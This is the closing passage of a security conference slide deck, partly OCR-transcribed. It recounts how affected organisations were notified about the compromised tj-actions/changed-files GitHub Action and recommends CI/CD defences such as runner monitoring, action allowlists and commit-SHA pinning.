This run ids has creds leaked. Please rotate (if applicable) and delete the workflow run.
13867756496, 13867629709, 13867434879, 13867422480, 13867292068, 13867077206, 13866683365, 13866592795,
13864483482, 13863919302
eg: https://github.com/langchain-ai/langsmith-sdk/actions/runs/13867756496/job/38810080294#step:3:60
You can also use hitps://github.com/step-security/changed-files going forward.
Reference about this incident: https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-
compromised
©
```

## Slide 99

### **Real-world Difficulties Aced by Affected Organizations**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Real-world Difficulties Aced by Affected
Organizations
Using a compromised tj-actions/changed-files GitHub Action #1583
© Closed
shubham-stepsecurity opened on Mar 17
Filing a public issue instead of reporting this as a private vulnerability, as | could not find a security.md file. Moreover, this
malware is a publicly known and an urgent issue.
This repo uses a compromised version of tj-actions/changed-files. The compromised action leaks secrets the runner has in
memory.
langsmith-sdk/.github/workflows
Line 32 in £d0796c
32 uses: tj-actions/changed-files@v45
This run ids has creds leaked. Please rotate (if applicable) and delete the workflow run.
13867756496, 13867629709, 13867434879, 13867422480, 13867292068, 13867077206, 13866683365, 13866592795,
13864483482, 13863919302
u can also use https://github.com/step-security/changed-files going forward.
Reference about this incident: https://www.stepsecurity.io/blog/harden-runner-detecti (j-actions-changed-files-action-is-
compromised
©
```

## Slide 100

### **Real-world Difficulties Aced by Affected Organizations**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Real-world Difficulties Aced by Affected
Organizations
13867756496, 13867629709, 13867434879, 13867422480, 13867292068, 13867077206, 13866683365, 13866592795,
13864483482, 13863919302
```

## Slide 101

### **Real-world Difficulties faced by Affected Organizations**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Real-world Difficulties faced by Affected
Organizations
Using a compromised tj-actions/changed-files GitHub Action #1583
© Closed
shubham-stepsecurity opened on Mar 17
Filing a public issue instead of reporting this as a private vulnerability, as | could not find a security.md file. Moreover, this
malware is a publicly known and an urgent issue.
This repo uses a compromised version of tj-actions/changed-files. The compromised action leaks secrets the runner has in
memory.
langsmith-sdk/.github/workflows/integration_tests.yml
Line 32 in fd0796c
32 uses: tj-actions/changed-files@v45
This run ids has creds leaked. F r (if appl
13867756496, 13867629709, 13867434879, 13867422480, 13867292068, 13867077206, 13866683365, 13866592795,
13864483482, 13863919302
u can also use https://github.com/step-security/changed-files going forward.
Reference about this incident: https://www.stepsecurity.io/blog/harden-runner-detecti (j-actions-changed-files-action-is-
compromised
©
```

## Slide 102

**Incident Response for Compromised Actions**

## Slide 103

### **Concrete Recommendations for CI/CD security**

- Security monitoring for CI/CD Runners

- Set and Enforce an Action Allowlist

- Pin third party GitHub Actions to specific commit SHA

- Incident Response for Compromised Actions

## Slide 104

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Redirect
Tags
Compromise
Popular
GitHub Action . | Imposter
caught due to
security
monitoring
on runners
access to
Organization
Secrets
DIDNT THINK THAT PART THROUGH,
DID YA?
```

## Slide 105

### **Acknowledgements**

We would like to thank:

- BlackHat Review Committee

- tj-actions and reviewdog maintainers

- GitHub

- Adnan Khan

- Wiz

- Palo Alto

- Our speaker coach Phil Young

## Slide 106

## Thank You!

Varun Sharma varunsh@stepsecurity.io

Ashish Kurmi akurmi@stepsecurity.io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
= StepSecurity
Thank You!
Varun Sharma Ashish Kurmi
varunsh@stepsecurity.io akurmi@stepsecurity.io
```
